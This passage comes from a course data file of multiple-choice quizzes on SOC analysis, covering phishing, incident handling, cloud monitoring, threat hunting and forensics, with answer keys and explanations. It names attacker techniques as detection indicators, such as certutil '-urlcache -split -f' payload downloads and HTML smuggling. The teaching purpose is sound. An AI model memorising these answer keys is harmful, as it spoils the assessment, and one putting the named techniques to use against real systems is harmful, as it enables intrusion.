      { id: "sap-q4-10", question: "Find recently modified PHP files?", options: ["ls /var/www, which lists the contents of the main web server root directory.", "find /var/www -name '*.php' -mtime -7, finding PHP files changed in the last week.", "grep php /etc/passwd, searching for users associated with the PHP service account.", "cat index.php, which displays the source code of the main home page file."], correctAnswer: 1, explanation: "find with -mtime -7 finds PHP files modified in last 7 days for web shell detection." },
      { id: "sap-q4-11", question: "Tool showing ALL Windows autostart locations?", options: ["Process Monitor, which captures real-time file system, registry, and process activity.", "Process Explorer, displaying active process trees and loaded DLL structures.", "Autoruns, which displays all autostart locations including Run keys, tasks, and services.", "TCPView, showing real-time network connections associated with active process IDs."], correctAnswer: 2, explanation: "Autoruns shows every autostart location including Run keys, services, tasks, drivers, WMI." },
      { id: "sap-q4-12", question: "Key indicator of certutil abuse?", options: ["Installing new digital certificates to verify software signature integrity.", "Using -urlcache -split -f parameters to download malicious payloads from external URLs.", "Viewing local certificate stores to check for expired cryptographic keys.", "Verifying the hash values of system files against trusted signature databases."], correctAnswer: 1, explanation: "certutil with -urlcache -split -f downloading from external URLs is common LOLBin abuse." },
      { id: "sap-q4-13", question: "pslist vs psscan comparison reveals?", options: ["Determining the total memory usage and pagefile allocation of active processes.", "Identifying hidden or unlinked processes created by advanced rootkits.", "Listing the files accessed by each process during their execution lifecycle.", "Measuring the network bandwidth consumed by active system services."], correctAnswer: 1, explanation: "psscan scans all memory while pslist uses active lists — differences reveal hidden processes." },
      { id: "sap-q4-14", question: "WMI persistence namespace?", options: ["root/default, which hosts general system event classes and properties.", "root/subscription, which contains event consumers and triggers for persistence.", "root/cimv2, representing the main corporate information model namespace.", "root/security, which handles administrative authorization and access permissions."], correctAnswer: 1, explanation: "root/subscription contains WMI event subscriptions for fileless persistence." },
      { id: "sap-q4-15", question: "First triage step on compromised Linux server?", options: ["Perform an immediate system reboot to clear any active memory compromises.", "Review active processes, network connections, and logged-in users before actions.", "Reinstall the operating system immediately using a clean installation template.", "Delete all system logs to prevent threat actors from covering their tracks."], correctAnswer: 1, explanation: "Check ps auxf, ss -tnp, and last/w before any remediation." }
    ]
  },

  {
    quizId: "sap-q5",
    courseId: "soc-analyst-path",
    title: "Phishing & Email Analysis Quiz",
    description: "Validate email header analysis and phishing response skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q5-1", question: "Email headers should be read in which order?", options: ["Top to bottom, showing the chronological path from the sender's client to the recipient.", "Bottom to top, since the oldest delivery hops and sending client details are at the bottom.", "Alphabetically by header field names, grouping all SPF, DKIM, and DMARC status fields.", "By header category, grouping all routing entries first, followed by content attributes."], correctAnswer: 1, explanation: "Bottom-to-top — oldest entries are at the bottom." },
      { id: "sap-q5-2", question: "What does SPF verify?", options: ["The cryptographic signature of the email body and subject line contents.", "Whether the sending server's IP address is authorized in the sender domain's DNS SPF record.", "The SSL/TLS certificate validity of the incoming receiving mail gateway.", "Whether the recipient's email address is valid in the destination Active Directory."], correctAnswer: 1, explanation: "SPF verifies that the sending IP is authorized for the sender's domain." },
      { id: "sap-q5-3", question: "Strong BEC/phishing indicator in headers?", options: ["A valid, passing DKIM signature matching the sender's apparent domain exactly.", "A mismatch between the visible 'From' header address and the technical 'Reply-To' address.", "A passing SPF check matching the sending IP address to the sender's company domain.", "A standard, recognized X-Mailer header name such as Microsoft Outlook or Exchange."], correctAnswer: 1, explanation: "Mismatched From and Reply-To means replies go to attacker's address." },
      { id: "sap-q5-4", question: "Tool for extracting VBA macros?", options: ["Wireshark, which reconstructs network streams and exports objects from captures.", "olevba (from the oletools suite), designed to parse and extract VBA macro code.", "Nmap, which scans ports and identifies services running on a remote system.", "Autoruns, which lists startup locations and registry run persistence keys."], correctAnswer: 1, explanation: "olevba extracts and analyzes VBA macros from Office documents." },
      { id: "sap-q5-5", question: "Why use ISO/IMG as attachments?", options: ["Providing better file compression rates than standard ZIP or RAR formats.", "Bypassing Windows Mark-of-the-Web (MOTW) security controls on files inside the archive.", "Being easier to create using default built-in Windows command-line utility tools.", "Producing significantly smaller file sizes to bypass attachment limit alerts."], correctAnswer: 1, explanation: "Files inside ISO don't get MOTW flag, allowing execution without warnings." },
      { id: "sap-q5-6", question: "What is HTML smuggling?", options: ["Hiding malicious HTML code within standard JPG or PNG image file payloads.", "Using JavaScript in HTML files to reconstruct and download Base64-encoded payloads locally.", "Compressing HTML codes using custom formats that bypass network monitoring proxies.", "Blocking HTML attachments from loading in the user's default browser console."], correctAnswer: 1, explanation: "HTML smuggling uses JavaScript to decode and auto-download Base64 payloads." },
      { id: "sap-q5-7", question: "First action with suspicious URL?", options: ["Clicking the link directly in an isolated browser sandbox to test its response.", "Defanging the URL by modifying its format (e.g. hxxp://) to prevent accidental execution.", "Sharing the raw link in corporate chat groups to ask other analysts for opinions.", "Blocking the domain immediately at the perimeter firewall level without checking."], correctAnswer: 1, explanation: "Always defang URLs first to prevent accidental clicking." },
      { id: "sap-q5-8", question: "What is a homoglyph attack?", options: ["Using visually identical characters from different character sets to spoof domain names.", "Encrypting domain names in database records to prevent search indexing.", "Registering expired domain names that previously had positive reputation scores.", "Creating extremely long domain names that exceed the standard DNS query length limits."], correctAnswer: 0, explanation: "Homoglyphs use visually similar characters (Cyrillic 'а' vs Latin 'a')." },
      { id: "sap-q5-9", question: "After credentials entered on phishing page?", options: ["Monitoring active log queues for any subsequent logon alerts from that account.", "Resetting the password, revoking active sessions, and checking for inbox forwarding rules.", "Sending a warning email to the affected user advising them to change their security settings.", "Waiting for 24 hours to confirm whether any unauthorized logins actually occur."], correctAnswer: 1, explanation: "Immediate reset, session revocation, and forwarding rule check are critical." },
      { id: "sap-q5-10", question: "AutoOpen in VBA indicates?", options: ["Specifying that the document file itself auto-opens when system starts.", "Ensuring the VBA macro script runs automatically when the document is opened.", "Enabling automatic file saving and backup procedures within the application.", "Checking for software updates automatically when the application is launched."], correctAnswer: 1, explanation: "AutoOpen() executes VBA code automatically when the document is opened." },
      { id: "sap-q5-11", question: "What to do with phishing beyond reported email?", options: ["Deleting the single reported email from the user's mailbox and closing the ticket.", "Searching for and purging matching phishing emails from all corporate mailboxes.", "Ignoring similar emails unless additional users file reports in the ticketing queue.", "Forwarding the email back to the IT helpdesk for standard desktop sorting."], correctAnswer: 1, explanation: "Search for and purge all instances across all mailboxes." },
      { id: "sap-q5-12", question: "What does DMARC combine?", options: ["Combining local antivirus engines and network perimeter firewall policies.", "Leveraging both SPF and DKIM checks to define domain authentication policies.", "Combining digital encryption algorithms and document signature protocols.", "Integrating recursive DNS server settings and secure HTTP gateway rules."], correctAnswer: 1, explanation: "DMARC combines SPF and DKIM for policy-level authentication." },
      { id: "sap-q5-13", question: "What determines phishing severity?", options: ["The specific hour of the day when the email was sent or received by servers.", "A combination of recipient count, click status, payload type, and target department sensitivity.", "The total character count and file size of the incoming email attachment.", "The geographical country of origin where the sending IP address is registered."], correctAnswer: 1, explanation: "Severity considers recipient count, clicks, payload type, and target sensitivity." },
      { id: "sap-q5-14", question: "Why check email forwarding rules after compromise?", options: ["Improving network email delivery speeds and optimizing mail gateway queues.", "Detecting attackers setting up forwarding rules to maintain email access after password resets.", "Checking disk storage limits and cleaning up old database archive folders.", "Enforcing corporate compliance guidelines for remote workers and branch offices."], correctAnswer: 1, explanation: "Forwarding rules let attackers keep receiving emails even after password change." },
      { id: "sap-q5-15", question: "Purpose of certificate transparency logs?", options: ["Verifying local SSL/TLS configurations on internal database servers.", "Monitoring public certificate records to discover newly registered domains for phishing.", "Revoking compromised certificates at the local Active Directory domain controller level.", "Generating new cryptographic certificates for internal corporate web applications."], correctAnswer: 1, explanation: "CT logs reveal all certificates for a domain, discovering related phishing infrastructure." }
    ]
  },
  {
    quizId: "sap-q6",
    courseId: "soc-analyst-path",
    title: "Incident Handling Final Exam",
    description: "Comprehensive exam on incident handling, reporting, and evidence.",
    passingScore: 80,
    timeLimit: 35,
    questions: [
      { id: "sap-q6-1", question: "Correct evidence collection order?", options: ["Disk image acquisition first, followed by memory capture and network traffic logs.", "Memory contents first, followed by network status, running processes, disk files, and backups.", "System backups first, followed by raw disk blocks and finally volatile RAM memory.", "Network connection state first, followed by local disk files and memory storage blocks."], correctAnswer: 1, explanation: "Most volatile to least: Memory → Network → Processes → Disk → Backups." },
      { id: "sap-q6-2", question: "Hash algorithm for evidence integrity?", options: ["MD5, which is fast to compute but suffers from high collision vulnerability rates.", "CRC32, which is designed exclusively for network checksum verification.", "SHA-256, which provides a high-entropy, collision-resistant signature for forensic validation.", "Base64, which is an encoding format rather than a cryptographic hashing algorithm."], correctAnswer: 2, explanation: "SHA256 is the standard for evidence hashing in legal proceedings." },
      { id: "sap-q6-3", question: "Blameless PIR focuses on?", options: ["Identifying the specific employee who caused the security incident for disciplinary action.", "Focusing on identifying system, process, and training gaps to improve future response capability.", "Ensuring that the security operations team is absolved of any legal or financial liability.", "Reducing headcount and security tool budgets based on incident performance logs."], correctAnswer: 1, explanation: "Focus on process improvements, not individual blame." },
      { id: "sap-q6-4", question: "Active ransomware on multiple systems is?", options: ["Priority Level 4 (P4) Low, representing a localized system alert requiring minor desk attention.", "Priority Level 3 (P3) Medium, requiring investigation during standard business hours.", "Priority Level 2 (P2) High, requiring containment actions within the next business day.", "Priority Level 1 (P1) Critical, demanding immediate, 24/7 response and containment actions."], correctAnswer: 3, explanation: "Active ransomware encryption is Critical (P1) requiring immediate response." },
      { id: "sap-q6-5", question: "Executive summary should contain?", options: ["A highly technical log breakdown detailing specific registry values and malware code offsets.", "A high-level, non-technical summary of what happened, business impact, and containment status.", "A long list of Indicators of Compromise (IOCs) such as file hashes and IP addresses.", "A comprehensive inventory list of all security software licenses owned by the firm."], correctAnswer: 1, explanation: "Executive summaries are for non-technical stakeholders." },
      { id: "sap-q6-6", question: "Why not analyze original evidence?", options: ["Analyzing original evidence is significantly slower than working on copy images.", "Direct analysis on original media risks modification, destroying legal admissibility.", "Original evidence disks are always encrypted and must be decrypted via copies.", "Specialized recovery tools can only execute scans on virtualized copy file formats."], correctAnswer: 1, explanation: "Working on copies preserves integrity for legal proceedings." },
      { id: "sap-q6-7", question: "PIRs must produce?", options: ["A report assigning blame and identifying team members responsible for failures.", "Specific, actionable recommendations with assigned owners and realistic deadlines.", "A general qualitative evaluation of team morale and operational workloads.", "A formal budget request submitted directly to the board of directors for security tools."], correctAnswer: 1, explanation: "Concrete action items with owners and deadlines are essential." },
      { id: "sap-q6-8", question: "Incident reports should use which timezone?", options: ["The local timezone where the incident analyst is physically working on tickets.", "UTC (Coordinated Universal Time), to eliminate timezone confusion across geo-locations.", "Eastern Standard Time (EST), which is the standard regulatory timezone for audits.", "The apparent timezone of the adversary's originating command and control (C2) server."], correctAnswer: 1, explanation: "UTC eliminates timezone confusion across geographic locations." },
      { id: "sap-q6-9", question: "When uncertain about severity?", options: ["Wait for additional data and events to confirm the threat before modifying priority.", "Classify the incident as low priority to avoid generating unnecessary alert paging noise.", "Escalate the incident up to a higher severity level to ensure immediate review.", "Ask a colleague on social media channels for their informal opinion on the alert type."], correctAnswer: 2, explanation: "Escalate UP — delays in critical incidents cause more damage than false alarms." },
      { id: "sap-q6-10", question: "Chain of custody must include?", options: ["A simple description of the hardware asset and the date it was collected.", "A detailed record tracking who handled the evidence, when, and every transfer with signatures.", "The cryptographic hash value of the evidence files and the serial number of the disk.", "The name of the investigating analyst and their corresponding corporate ID number."], correctAnswer: 1, explanation: "Track every interaction for legal admissibility." },
      { id: "sap-q6-11", question: "Key metric after PIR improvements?", options: ["The total number of review meetings held and the count of slides in the report.", "The recurrence rate of the same incident type within a specified post-remediation timeframe.", "The volume of email communication sent to stakeholders during the containment phase.", "The overall satisfaction score of external compliance auditors during review sessions."], correctAnswer: 1, explanation: "Recurrence rate measures whether improvements were effective." },
      { id: "sap-q6-12", question: "IOCs in reports should be?", options: ["Kept live and clickable to allow stakeholders to test connections themselves.", "Defanged (e.g. hxxp://, [.]com) to prevent accidental execution or navigation.", "Encrypted in password-protected zip archives to comply with data privacy policies.", "Hidden entirely from the main text body and listed only in secure database logs."], correctAnswer: 1, explanation: "Defanged IOCs prevent accidental clicks on malicious links." },
      { id: "sap-q6-13", question: "How to balance threat and impact in classification?", options: ["Focus exclusively on the complexity and technical skill level of the threat agent.", "Focus exclusively on the dollar value of the affected server hardware components.", "Using a matrix combining threat severity (technical force) and business impact (downtime).", "Marking all incoming alerts as critical to ensure immediate response from all teams."], correctAnswer: 2, explanation: "Use a matrix: High threat + High impact = P1." },
      { id: "sap-q6-14", question: "P1 incident response time?", options: ["Within 24 hours, to allow analysts to complete their daily shifts and write reports.", "Within 4 hours, which matches standard SLA agreements for external hosting providers.", "Within 1 hour, allowing time for initial triage and console alert query validation.", "Within 15 minutes, requiring immediate triage and activation of response playbooks."], correctAnswer: 3, explanation: "Critical incidents require immediate response within 15 minutes." },
      { id: "sap-q6-15", question: "Most damaging PIR anti-pattern?", options: ["PIR meetings lasting longer than 60 minutes due to deep discussion on findings.", "Creating a culture of blame and identifying scapegoats rather than correcting processes.", "Generating more than 5 action items from a single incident post-mortem review.", "Scheduling conflicts that delay the review session for up to a week after resolution."], correctAnswer: 1, explanation: "Blaming individuals kills reporting culture." },
      { id: "sap-q6-16", question: "Should dead ends be documented in reports?", options: ["Never, as they make the security team look incompetent and waste reader time.", "Always, as documenting dead ends prevents other analysts from repeating failed steps.", "Only if explicitly requested by external compliance auditing firms or executives.", "Stored exclusively in informal chat logs rather than the official final incident report."], correctAnswer: 1, explanation: "Dead ends prevent others from repeating unsuccessful investigation steps." },
      { id: "sap-q6-17", question: "Monitor compromised accounts for how long?", options: ["A minimum of 24 hours, to verify that the initial containment blocks are working.", "A minimum of 72 hours, to detect any delayed persistence mechanisms or secondary access.", "A minimum of 1 week, which matches standard network backup rotation schedules.", "A minimum of 1 month, to ensure compliance with general financial logging standards."], correctAnswer: 1, explanation: "Monitor at least 72 hours for delayed unauthorized access." },
      { id: "sap-q6-18", question: "PIRs should be mandatory for?", options: ["Priority Level 1 (Critical) incidents only, due to the high workload of security teams.", "All P1 (Critical) and P2 (High) incidents, to ensure systemic improvements are captured.", "Only when explicitly requested by corporate legal counsel or human resources.", "Never, as post-incident reviews do not directly assist in active threat containment."], correctAnswer: 1, explanation: "Mandatory for all P1 and P2 incidents for systematic improvement." },
      { id: "sap-q6-19", question: "Report recommendations should include?", options: ["Short-term technical fixes only, such as patching the single compromised host system.", "A comprehensive mix of short-term mitigation, long-term architecture, process, and training.", "A detailed list of recommended hardware security tools and software brands to purchase.", "Nothing, if the incident has been successfully resolved and the host is reimaged."], correctAnswer: 1, explanation: "Comprehensive recommendations cover immediate, long-term, process, and training needs." },
      { id: "sap-q6-20", question: "Ultimate goal of the IR lifecycle?", options: ["Closing alerts in the queue as quickly as possible to meet average triage metrics.", "Feeding lessons learned back into the loop to continuously improve detection and response.", "Avoiding organization-wide audits and regulatory penalties through minimal logging.", "Reducing the workload of Tier 1 analysts by disabling highly sensitive SIEM rules."], correctAnswer: 1, explanation: "The IR lifecycle feeds lessons learned into continuous improvement." }
    ]
  },
  {
    quizId: "sap-q7",
    courseId: "soc-analyst-path",
    title: "Cloud Security Monitoring Quiz",
    description: "Test your cloud security knowledge across AWS, Azure, and container environments.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q7-1", question: "In the shared responsibility model, who is ALWAYS responsible for data security?", options: ["The cloud provider, who owns the physical host server hardware and network infrastructure.", "The customer, who always retains ownership and responsibility for their data and access.", "Both customer and provider equally, regardless of the deployment model selected.", "Determined exclusively by the specific service level agreement (SLA) contract terms."], correctAnswer: 1, explanation: "Customers always own their data security regardless of cloud model (IaaS/PaaS/SaaS)." },
      { id: "sap-q7-2", question: "What AWS service logs all API calls?", options: ["GuardDuty, which provides managed threat detection alerts based on log feeds.", "CloudTrail, which records a comprehensive history of API calls made in the AWS account.", "CloudWatch, which monitors system performance metrics and aggregates application logs.", "Inspector, which scans EC2 instances for software vulnerabilities and policy exposures."], correctAnswer: 1, explanation: "CloudTrail records every API call made in an AWS account for auditing and investigation." },
      { id: "sap-q7-3", question: "What does the CloudTrail event 'StopLogging' indicate?", options: ["A routine maintenance log generated automatically during AWS backend service updates.", "A critical indicator of defense evasion, suggesting an attacker is attempting to cover tracks.", "A standard log rotation event triggered when log files exceed size limit thresholds.", "An informational event indicating the AWS account is scheduled for closure."], correctAnswer: 1, explanation: "StopLogging is a critical indicator of defense evasion — attackers disable logging to hide activity." },
      { id: "sap-q7-4", question: "What is the #1 cloud security threat according to CSA?", options: ["Distributed Denial of Service (DDoS) attacks targeting public cloud service endpoints.", "Cloud infrastructure misconfiguration, such as exposed storage buckets and open ports.", "Malicious insider threats deliberately stealing corporate intellectual property.", "Zero-day software exploits targeting hypervisors and virtualization technologies."], correctAnswer: 1, explanation: "Misconfiguration (public S3 buckets, open security groups) is the most common cloud security issue." },
      { id: "sap-q7-5", question: "What does 'impossible travel' detection identify?", options: ["Identifying user accounts traveling between office locations during standard shifts.", "Flagging user authentication from geographically distant locations within an impossible timeframe.", "Detecting the usage of commercial VPN services or anonymizing proxy networks.", "Identifying changes in the local operating system time zone settings on client devices."], correctAnswer: 1, explanation: "Impossible travel flags when a user authenticates from two distant locations faster than physically possible." },
      { id: "sap-q7-6", question: "Which Azure log tracks user sign-in activity?", options: ["Azure Activity Log, tracking resource modification and subscription-level changes.", "Azure AD Sign-in Logs, recording all authentication attempts with location and risk context.", "Azure NSG Flow Logs, capturing network IP traffic metadata passing through gateways.", "Azure Diagnostic Logs, recording system performance and application-level errors."], correctAnswer: 1, explanation: "Azure AD Sign-in Logs record all authentication attempts with location, device, and risk information." },
      { id: "sap-q7-7", question: "Why is running containers as root dangerous?", options: ["It causes high system memory utilization and CPU bottlenecks on the host server.", "If an attacker escapes the container, they gain full root privileges on the host system.", "It prevents standard application logs from being forwarded to the central SIEM queue.", "It causes network routing conflicts and port binding issues inside the container stack."], correctAnswer: 1, explanation: "If an attacker escapes a root container, they have root access to the underlying host system." },
      { id: "sap-q7-8", question: "What tool provides open-source runtime detection for containers?", options: ["kube-bench, which audits Kubernetes clusters against CIS hardening benchmarks.", "Falco, which detects anomalous runtime behavior and threat events in containers.", "Trivy, which scans container images for software vulnerabilities and configuration bugs.", "Clair, designed to analyze container layers and flag known CVE exposures."], correctAnswer: 1, explanation: "Falco detects runtime threats in containers like unexpected shell access, network connections, and file modifications." },
      { id: "sap-q7-9", question: "What M365 operation indicates possible email compromise persistence?", options: ["MailItemsAccessed events, indicating standard reading of emails by authorized users.", "Creation of new inbox rules configured to forward sensitive emails to external addresses.", "FileDownloaded events, tracking standard downloading of attachments from OneDrive.", "UserLoggedIn events, showing recurring logins from standard employee workstations."], correctAnswer: 1, explanation: "Creating inbox forwarding rules allows attackers to maintain access to emails even after password reset." },
      { id: "sap-q7-10", question: "What GuardDuty finding indicates crypto mining?", options: ["UnauthorizedAccess, indicating failed login attempts on EC2 instance ports.", "Recon:PortProbe, flagging external port scanning activity targeting the instance.", "CryptoCurrency:EC2/BitcoinTool, indicating active mining tools running on the host.", "Trojan:DNSExfiltration, indicating a potential malware beaconing connection via DNS."], correctAnswer: 2, explanation: "GuardDuty specifically detects cryptocurrency mining activity on EC2 instances." },
      { id: "sap-q7-11", question: "First response to compromised AWS access keys?", options: ["Deleting the entire IAM user account immediately, regardless of active services.", "Deactivating the compromised access keys and revoking all active user sessions.", "Changing the login password of the affected IAM user in the management console.", "Stopping all EC2 instances and database services in the affected AWS region."], correctAnswer: 1, explanation: "Immediately disable compromised access keys and revoke active sessions to stop unauthorized access." },
      { id: "sap-q7-12", question: "What Kubernetes resource gives full cluster access?", options: ["A Kubernetes pod resource running with privileged security context settings.", "A Service account designed to manage load balancer routing configurations.", "The cluster-admin ClusterRole, which grants unrestricted access to all resources.", "A ConfigMap containing database passwords and API keys in cleartext format."], correctAnswer: 2, explanation: "The cluster-admin ClusterRole grants unrestricted access to all resources in the Kubernetes cluster." },
      { id: "sap-q7-13", question: "What is OAuth app consent phishing?", options: ["Intercepting and stealing OAuth access tokens during network transmission.", "Tricking users into granting malicious OAuth applications broad access to their accounts.", "Launching a direct exploit attack against the corporate OAuth authorization server.", "Exploiting expired OAuth tokens that have not been properly invalidated by systems."], correctAnswer: 1, explanation: "Attackers create malicious OAuth apps that request broad permissions (mail.read, files.readwrite) via consent phishing." },
      { id: "sap-q7-14", question: "Which cloud detection monitors for public storage exposure?", options: ["Monitoring sudden anomalies in outbound network data transfer volume levels.", "Continuous monitoring of S3 bucket policies and Blob access levels for public access.", "Analyzing local client system DNS logs for requests to storage service domains.", "Configuring host CPU utilization alerts on database backup server systems."], correctAnswer: 1, explanation: "Monitoring bucket/container policies for public access prevents accidental data exposure." },
      { id: "sap-q7-15", question: "What does VPC Flow Logs capture?", options: ["Full application payloads and packet content passing through the VPC network.", "IP network traffic metadata including source/destination IPs, ports, and action details.", "User authentication logs and access request histories on virtual machines.", "Database query strings and file transfer metadata from storage services."], correctAnswer: 1, explanation: "VPC Flow Logs capture network traffic metadata including source/destination IPs, ports, and allow/deny actions." }
    ]
  },
  {
    quizId: "sap-q8",
    courseId: "soc-analyst-path",
    title: "Threat Intelligence & Hunting Quiz",
    description: "Assess threat intel lifecycle, IOC management, and hunting methodology skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q8-1", question: "How many phases are in the threat intelligence lifecycle?", options: ["The threat intelligence lifecycle consists of 4 basic steps focusing on collection.", "The threat intelligence lifecycle consists of 5 steps aligning with the standard ITIL framework.", "The threat intelligence lifecycle consists of 6 phases: Planning through Feedback.", "The threat intelligence lifecycle consists of 7 phases including defensive containment."], correctAnswer: 2, explanation: "The 6 phases: Planning & Direction, Collection, Processing, Analysis, Dissemination, Feedback." },
      { id: "sap-q8-2", question: "What is STIX?", options: ["A network routing protocol designed to secure external communication channels.", "A structured XML/JSON language used to share cyber threat intelligence details.", "A centralized SIEM platform that aggregates security logs from multiple hosts.", "An encryption standard defining key exchange rules for virtual private networks."], correctAnswer: 1, explanation: "STIX (Structured Threat Information eXpression) is the standard JSON format for threat intelligence." },
      { id: "sap-q8-3", question: "What does TAXII provide?", options: ["A threat analysis methodology focusing on adversary capability matrices.", "An application-layer protocol designed to automate the transport of STIX data.", "A container sandboxing technology used to analyze untrusted software samples.", "A vulnerability scanning tool that audits network devices for open ports."], correctAnswer: 1, explanation: "TAXII defines how STIX data is shared between organizations via REST APIs." },
      { id: "sap-q8-4", question: "Typical IOC expiration for IP addresses?", options: ["A short period of 7 days, to capture extremely rapid dynamic host changes.", "A standard period of 30 days, before evaluating if the IP was reassigned.", "A long period of 1 year, to build historical threat databases for queries.", "IP indicators never expire and should remain blocked permanently in firewalls."], correctAnswer: 1, explanation: "IP addresses change frequently — 30 days is a typical expiration before they may be reassigned to legitimate use." },
      { id: "sap-q8-5", question: "What distinguishes threat hunting from detection?", options: ["Threat hunting utilizes advanced AI tools, while detection relies on basic scripts.", "Threat hunting is proactive and hypothesis-driven; detection is reactive to alerts.", "Threat hunting is entirely automated; detection requires manual analyst triage.", "Detection is focused on host investigation; threat hunting is only for networks."], correctAnswer: 1, explanation: "Hunting proactively searches for threats that bypass automated detections, while detection waits for alerts." },
      { id: "sap-q8-6", question: "A hunting hypothesis should be?", options: ["Vague and broad, to cover any potential anomaly in network connection logs.", "Specific, testable, and based on threat intelligence or ATT&CK coverage gaps.", "Structured to always be confirmed by the data, validating security efforts.", "Based exclusively on analyst intuition without referring to log structures."], correctAnswer: 1, explanation: "Good hypotheses are specific, testable with available data, and based on threat intelligence or ATT&CK gaps." },
      { id: "sap-q8-7", question: "What is 'stacking' in threat hunting?", options: ["Building redundant server infrastructure to prevent system outages during attacks.", "Frequency analysis, counting event occurrences to isolate rare anomalies (long tail).", "Layering multiple firewall systems at the network perimeter trust boundaries.", "Aggregating multiple log sources into a single database search index."], correctAnswer: 1, explanation: "Stacking counts occurrences and sorts by frequency — rare values at the bottom often indicate threats." },
      { id: "sap-q8-8", question: "How to detect C2 beaconing?", options: ["Run a full file signature scan using local antiviruses and compare hash values to threat databases.", "Analyze network connection logs for consistent time intervals and low variation or jitter values.", "Monitor host CPU utilization metrics and alert on sustained processing spikes over a 24-hour period.", "Scan external host firewalls weekly for open service ports and unauthorized interface listeners."], correctAnswer: 1, explanation: "C2 beaconing has regular intervals with low jitter (variation), which is detectable through statistical analysis." },
      { id: "sap-q8-9", question: "What is tactical threat intelligence?", options: ["High-level risk trends and competitor intelligence reports designed specifically for executive boards.", "Geopolitical analysis and macroeconomic security threat profiles for multinational operations planning.", "Long-term security budget planning templates and hardware vendor lifecycle assessment reports.", "Actionable indicators of compromise and adversary TTPs used for immediate detection by SOC analysts."], correctAnswer: 3, explanation: "Tactical intelligence includes specific IOCs and TTPs that analysts can immediately use for detection." },
      { id: "sap-q8-10", question: "What should a hunt report always include?", options: ["A simple list of discovered system vulnerabilities and threat indicators without context details.", "A comprehensive document detailing the hypothesis, data sources, methodology, findings, and remediation steps.", "An exclusive collection of firewall IP block lists to be deployed directly on perimeter gateways.", "A high-level executive presentation focusing solely on project status and general security budgets."], correctAnswer: 1, explanation: "Complete hunt reports document the hypothesis, data sources, methodology, findings, and operationalized detections." },
      { id: "sap-q8-11", question: "What is 'long tail analysis'?", options: ["A monitoring technique that tracks the duration of long-running active background process executions.", "An analysis method focusing on the rare 2% of network events that fall outside common top-talker lists.", "Measuring average network latency and packet delivery delays across segmented logical subnetworks.", "A compliance auditing strategy used to determine long-term database log retention policy guidelines."], correctAnswer: 1, explanation: "Long tail analysis focuses on rare events (the 2%) that fall outside common patterns — where threats often hide." },
      { id: "sap-q8-12", question: "Best source for hunting hypotheses?", options: ["Random guessing based on current security events and recent analyst operational hunches.", "Vendor marketing brochures highlighting automated threat detection capabilities of products.", "Actionable threat intelligence reports and identified MITRE ATT&CK coverage gaps in the environment.", "General security discussions and threat rumors shared on public social media channels and chats."], correctAnswer: 2, explanation: "Threat intelligence and MITRE ATT&CK coverage gaps provide evidence-based starting points for hunts." },
      { id: "sap-q8-13", question: "What indicates 3+ standard deviations in data transfer?", options: ["A standard, expected daily variation in network traffic volume that fits within default baselines.", "A system configuration error resulting in duplicate packet transmissions on the network interface.", "A scheduled high-volume database backup operation executing during standard off-peak maintenance hours.", "A statistically significant anomaly that warrants immediate investigation for potential exfiltration."], correctAnswer: 3, explanation: "3+ standard deviations from the mean is statistically unusual and warrants investigation for data exfiltration." },
      { id: "sap-q8-14", question: "How often should baselines be rebuilt?", options: ["Every calendar month, to account for organic network changes while keeping detections relevant.", "Every calendar year, to coincide with standard corporate security policy and audit reviews.", "Only following a major security incident or network breach to document the post-compromise state.", "Baselines should remain static and never be modified after their initial configuration phase."], correctAnswer: 0, explanation: "Monthly baseline rebuilds account for organic changes while keeping detection relevant." },
      { id: "sap-q8-15", question: "What should hunting findings be converted into?", options: ["Deleted immediately to clean up database search indexes and optimize disk storage constraints.", "Manual checks scheduled for execution by security analysts during standard daily triage shifts.", "Automated detection rules deployed in the SIEM for continuous monitoring of the environment.", "Formal compliance reports stored in GRC archives without active implementation in security tools."], correctAnswer: 2, explanation: "Operationalizing findings into automated detection rules ensures the same technique is caught in the future." }
    ]
  },
  {
    quizId: "sap-q9",
    courseId: "soc-analyst-path",
    title: "Digital Forensics Assessment",
    description: "Evaluate disk forensics, timeline analysis, and anti-forensics detection skills.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      { id: "sap-q9-1", question: "Correct order of the forensic process?", options: ["Collection of data first, followed by technical Analysis, and finally general Identification.", "Analysis of systems first, followed by Preservation of logs, and final Presentation.", "Identification of sources, Preservation, Collection, Analysis, and final Presentation of evidence.", "Presentation of reports first, followed by Collection and Analysis of system data."], correctAnswer: 2, explanation: "The forensic process follows: Identification → Preservation → Collection → Analysis → Presentation." },
      { id: "sap-q9-2", question: "Most volatile evidence type?", options: ["Disk data blocks and local database files stored on static storage partitions.", "CPU registers and physical memory (RAM) contents, which disappear on shutdown.", "System backup tapes and archived database records stored in separate locations.", "Log files generated by syslog and other application services written to disk."], correctAnswer: 1, explanation: "CPU registers and memory are the most volatile — they're lost in seconds when power is removed." },
      { id: "sap-q9-3", question: "What hash algorithm is standard for evidence integrity?", options: ["MD5, which is fast to compute but suffers from high collision vulnerability rates.", "CRC32, which is designed exclusively for network checksum verification.", "SHA-256, which provides a high-entropy, collision-resistant signature for forensic validation.", "Base64, which is an encoding format rather than a cryptographic hashing algorithm."], correctAnswer: 2, explanation: "SHA-256 is the forensic standard for evidence integrity verification in legal proceedings." },
      { id: "sap-q9-4", question: "What is the NTFS Master File Table ($MFT)?", options: ["A disk encryption key used to encrypt the entire host partition volume.", "A database containing detailed metadata for every single file on the NTFS volume.", "A network routing table mapping local hosts to their physical switch interfaces.", "A memory allocation table tracking RAM allocations for running applications."], correctAnswer: 1, explanation: "The $MFT stores metadata (timestamps, size, location, permissions) for every file and directory on NTFS." },
      { id: "sap-q9-5", question: "How to detect timestomping?", options: ["Checking the file size and comparing it to average standard templates.", "Comparing the $STANDARD_INFORMATION (easily modified) and $FILE_NAME timestamps.", "Running a full signature antivirus scan on the folder containing target files.", "Reviewing the file extension type and matching it to known bad execution signatures."], correctAnswer: 1, explanation: "$SI timestamps are easily modified but $FN timestamps are harder to change — discrepancy indicates timestomping." },
      { id: "sap-q9-6", question: "What Windows Event ID indicates Security log was cleared?", options: ["Event ID 4624, which tracks successful user logon session creation on the host.", "Event ID 4688, logging process creation events and parent command line executions.", "Event ID 1102, which is generated when the Windows Security audit log is manually cleared.", "Event ID 7045, logging the installation of a new background service on Windows."], correctAnswer: 2, explanation: "Event ID 1102 is generated when the Windows Security audit log is cleared." },
